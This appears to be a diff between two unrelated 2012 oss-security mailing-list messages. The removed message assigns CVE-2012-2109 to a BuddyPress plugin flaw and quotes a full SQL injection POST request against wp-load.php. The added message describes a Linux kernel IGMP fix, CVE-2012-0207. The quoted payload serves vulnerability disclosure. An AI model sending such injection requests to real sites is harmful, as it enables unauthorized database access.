@@ -1,70 +1,24 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/16/10
-Message-ID: <4F8C74AE.7090205@redhat.com>
-Date: Mon, 16 Apr 2012 13:36:14 -0600
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/01/10/5
+Message-ID: <4F0BEA1C.4080609@redhat.com>
+Date: Tue, 10 Jan 2012 15:34:52 +0800
+From: Eugene Teo <eugene@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: Henri Salo <henri@...v.fi>
-Subject: Re: CVE-request: WordPress BuddyPress-plugin SQL-injection 1.5.4
+CC: "Steven M. Christey" <coley@...us.mitre.org>
+Subject: CVE-2012-0207 kernel: igmp: Avoid zero delay when receiving odd mixture of IGMP queries
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Commit 5b7c84066733c5dfb0e4016d939757b38de189e4 ('ipv4: correct IGMP
+behavior on v3 query during v2-compatibility mode') added yet another
+case for query parsing, which can result in max_delay = 0.  Substitute
+a value of 1, as in the usual v3 case.
 
-On 04/15/2012 03:05 AM, Henri Salo wrote:
-> Hello,
-> 
-> Can I get 2012 CVE-identifier for WordPress BuddyPress-plugin
-> SQL-injection.
-> 
-> Affected: 1.5.4 Fixed: 1.5.5 Vendor:
-> http://buddypress.org/2012/03/buddypress-1-5-5/ OSVDB:
-> http://osvdb.org/show/osvdb/80763 Changelog:
-> http://codex.buddypress.org/releases/version-1-5/ (doesn't seem to
-> say about this issue)
+Reported-by: Simon McVittie <smcv <at> debian.org>
+References: http://bugs.debian.org/654876
+Signed-off-by: Ben Hutchings <ben <at> decadent.org.uk>
 
-Please use CVE-2012-2109for this issue.
+http://article.gmane.org/gmane.linux.network/217256
 
-> http://seclists.org/bugtraq/2012/Apr/4 """ Hi,
-> 
-> I would like disclosure SQL injection vulnerability if Buddypress
-> plugin affecting last versions. This issue was reported to
-> developers and resolved in 1.5.5 version. So, I suggest all having
-> this plugin in their blogs update to last version, if you haven't
-> done it yet. Example of POST message with sql injection is below.
-> 
-> POST /wp-load.php HTTP/1.1 User-Agent: Mozilla Host: example.com 
-> Accept: */* Referer: http://example.com/activity/?s=b Connection:
-> Keep-Alive Content-Length: 153 Content-Type:
-> application/x-www-form-urlencoded
-> 
-> action=activity_widget_filter&page=1%26exclude%3d1)and(1=0)UNION(SELECT(1),(2),(3),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17))%3b--+
->
-> 
-"""
-> 
-> - Henri Salo
+Introduced in 5b7c8406 2.6.36-rc8
 
-
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
-
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
-
-iQIcBAEBAgAGBQJPjHSuAAoJEBYNRVNeJnmTudoP/2bj2DvLJ+omeUy1DbIrAw1f
-5ar2lOrhYHt4UjOu3Nddx3Z7JuxL6ee7GjmdZ+AZwAXe1Di4Caho/n1gKP5dLTjc
-HuIOgnNX7frGJvGLZn0mqQSM4CLg2HXLPZdk1w5P2eINMA6Gchb1ZmzGd3iPVPPK
-+hW+K/4EkMOGvnfz1FU34IA8vgyzvre98ZVn7vRli7b2Hvu9cH49+9txqftMMh1u
-tLO9lpjuuI+tzDlnm6FuTIEBX6zxcIMvdWEEXwKAjTmXeXgs3re/PvAV4TiqYGR2
-gVquLgZupX534PGDDvJLOyfcLICoHCj/PZ1hTCvyVMbgtuoFNoMeUARxlHR6dzgD
-00afqpScIvNji+Q/vSvQ7jU559+IAyq9Z0Mz+wYut3elcUi8GIkdJlt98xUqE4b+
-M2ZPzkF+LnFTMBaIjgzjY1wqgmhyxQhaUDYXfO2qsAEi39oLVZpVNr+uAWnpGY58
-YV5ilvmgqdILJt4cyYdc/aE3hrnsexGQntwGE8CeBUefqdq2LPEene8O2/rfoYkn
-hSH9rtUN3sXIVClo7TsBX3ZGbi50CtH7FgHBzUrDRAflRkK1nSw8ZMMJy/cjPtz9
-BfneEin1fctogvfo1L9xO9Lx4Z3G7gK/7xKXkhqiXsfVgwdBb3liUWo0LS2qcOy6
-StSxvvLRwvnhFkQJlDrh
-=+3UG
------END PGP SIGNATURE-----
+Thanks, Eugene
